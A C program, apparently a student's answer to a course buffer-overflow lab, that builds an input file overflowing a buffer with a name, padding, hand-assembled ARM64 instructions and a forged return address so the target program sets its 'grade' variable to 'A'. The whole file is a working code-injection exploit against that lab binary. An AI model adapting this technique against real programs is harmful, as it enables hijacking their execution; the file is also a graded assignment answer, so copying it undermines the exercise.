#include <stdio.h>
#include "miniassembler.h"

int main(void) {

    int i; 
    unsigned long ulAddr;
    unsigned int uiMov; 
    unsigned int uiAdr;
    unsigned int uiStrb;
    unsigned int uiB;
    
    FILE *psFile;
    psFile = fopen("dataA", "w");

    /* Write name to file */
    fprintf(psFile, "Chewei Puaji");

    for (i = 0; i < 4; i++) {
        putc('\0', psFile);
    }


    /*  mov w0, 'A' */    

    uiMov = MiniAssembler_mov(0, 'A');
    fwrite(&uiMov, sizeof(unsigned int), 1, psFile);


    /* addr x1, grade */
    
    uiAdr = MiniAssembler_adr(1, 0x420044, 0x42006C);
    fwrite(&uiAdr, sizeof(unsigned int), 1, psFile);

    /* strb w0, [x1] */

    uiStrb = MiniAssembler_strb(0, 1);
    fwrite(&uiStrb, sizeof(unsigned int), 1, psFile);


    /* b printf */

    uiB = MiniAssembler_b(0x400864, 0x420074);
    fwrite(&uiB, sizeof(unsigned int), 1, psFile);

    /* Fill in null bytes to reach the end of buf array */
    for (i = 0; i < 16; i++) {
        putc('\0', psFile);
    }

    /* Write the return address */ 
    ulAddr = 0x420068;
    fwrite(&ulAddr, sizeof(unsigned long), 1, psFile);

    /* Close the file and return 0 */
    fclose(psFile); 
    return 0; 

}